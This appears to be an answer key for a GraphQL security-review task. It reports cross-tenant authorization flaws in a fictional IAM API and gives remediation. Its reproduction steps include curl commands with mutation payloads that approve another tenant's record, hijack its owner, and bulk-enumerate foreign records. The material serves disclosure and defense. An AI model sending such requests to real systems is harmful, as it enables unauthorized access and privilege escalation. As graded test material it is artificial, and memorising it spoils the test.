# Expected Response

## System
- Domain: Cloud IAM / Identity Provider
- System: VaultGuard IAM API
- Example ID: GQL-0044

## Priority Findings

### Finding 1: Cross-Tenant Write + Draft-to-Approved Escalation on IAM Record via updateResource (Pattern 10.5 — Draft/Non-Published Resource Access)
**Severity:** Critical
**Category:** BOLA / Insecure State Transition

**Summary:**
An authenticated user from `tenant-8cc1` accessed IAM record `R-2044` belonging to `tenant-f371` by supplying the victim's `resourceId` directly in the `updateResource` mutation. The input injected `status: "approved"` and `ownerId: "attacker-8cc1f371"`, escalating a cross-tenant IAM record from its prior state to `approved` — the equivalent of publishing/activating an identity record that the attacker had no business accessing. In an IAM/IdP context, approving a cross-tenant policy, role, or identity record can grant unauthorized principals access to protected resources. The response `200 OK` with `tenant-f371` data confirms both the BOLA and the state transition succeeded.

**Evidence from HAR:**
- Request: `POST https://api.vaultguard-iam-api.example.com/graphql` (2026-04-13T16:22:34Z, 124 ms)
- JWT `x-tenant-id`: `tenant-8cc1` — attacker's identity
- Mutation payload: `updateResource(id: "R-2044", input: {status: "approved", ownerId: "attacker-8cc1f371"})` — cross-tenant IAM record targeted; draft escalated to approved
- Response HTTP status: `200 OK` — write succeeded, no authorization error
- Response `tenantId`: `tenant-f371` — victim tenant's IAM record was modified
- Response `ownerId`: `other-user-8cc1f371`
- Response `sensitiveField`: `CONFIDENTIAL-8cc1f371` — IAM sensitive data disclosed
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-8cc1f371`

**Root Cause (§4.0 RISK-GQL-044 + §5.0):** The `updateResource` resolver fetches and writes by `resourceId` only, without `WHERE tenant_id = $jwt.tenantId`. §5.0 (Pattern 10.5): "The resolver handling `resourceId` does not enforce ownership or tenancy boundaries" — non-published (draft) records in any tenant are accessible and modifiable by any authenticated user.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-044 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 10.5 | "resolver does not enforce ownership or tenancy boundaries" — draft resource access |
| HAR entry | request.postData | `updateResource(id: "R-2044", input: {status: "approved", ownerId: "attacker-8cc1f371"})` |
| HAR entry | response.content | `tenantId: "tenant-f371"`, `200 OK` — cross-tenant IAM record written |

---

### Finding 2: Cross-Tenant Bulk IAM Record Enumeration via bulkResourceLookup (Pattern 1.9)
**Severity:** High
**Category:** BOLA / Mass Enumeration

**Root Cause (§4.0):** "The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering." In an IAM system, bulk enumeration of IAM records exposes policy definitions, role bindings, and identity data across tenants.

---

## Steps to Reproduce

### Step 1 — Confirm attacker baseline (own IAM records)
```bash
curl -s -X POST https://api.vaultguard-iam-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8cc1" \
  -d '{"query": "mutation { updateResource(id: \"R-8cc1-001\", input: {status: \"pending\"}) { resourceId status tenantId } }"}'
```
**Expected:** Updates own IAM record; `tenantId: "tenant-8cc1"`.

### Step 2 — Cross-tenant draft-to-approved escalation (HAR attack)
```bash
curl -s -X POST https://api.vaultguard-iam-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8cc1" \
  -d '{"query": "mutation { updateResource(id: \"R-2044\", input: {status: \"approved\", ownerId: \"attacker-8cc1f371\"}) { resourceId status tenantId } }"}'
```
**Vulnerable outcome:** `200 OK`, IAM record `R-2044` (belonging to `tenant-f371`) updated to `status: "approved"`, `ownerId` hijacked to `attacker-8cc1f371` — draft IAM record activated by cross-tenant attacker.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"updateResource": null}}`.

### Step 3 — Bulk cross-tenant IAM record enumeration
```bash
curl -s -X POST https://api.vaultguard-iam-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8cc1" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2044\", \"R-f371-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns IAM records from `tenant-f371` — policy definitions and identity data exposed.
**Secure outcome:** Only own-tenant records returned; cross-tenant IDs yield null or FORBIDDEN.

## Secure Outcome Verification
For **Step 2**, a correctly patched implementation MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "updateResource": null }
}
```

## Remediation
1. **Resolver-level tenant guard on updateResource:** Before writing, verify `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`. Reject with FORBIDDEN if the record belongs to a different tenant.
2. **Strip ownerId from ResourceInput:** `ownerId` must NOT be accepted from the client — derive from JWT's `sub`. This eliminates ownership hijack.
3. **State transition authorization:** For `status: "approved"` transitions, enforce a separate authorization check verifying the caller has the `approve` role within their own tenant — not just any valid JWT.
4. **Per-ID ownership filter in bulkResourceLookup:** Post-fetch, reject any result whose `tenant_id` ≠ JWT's `tenantId`.
5. **Redis cache key includes tenantId:** §2.0 caches by `resourceId` only — change to `resourceId:tenantId`.
6. **Automated regression tests:** Assert `tenant-8cc1` calling `updateResource(id: "R-2044", ...)` on a `tenant-f371` record receives FORBIDDEN.
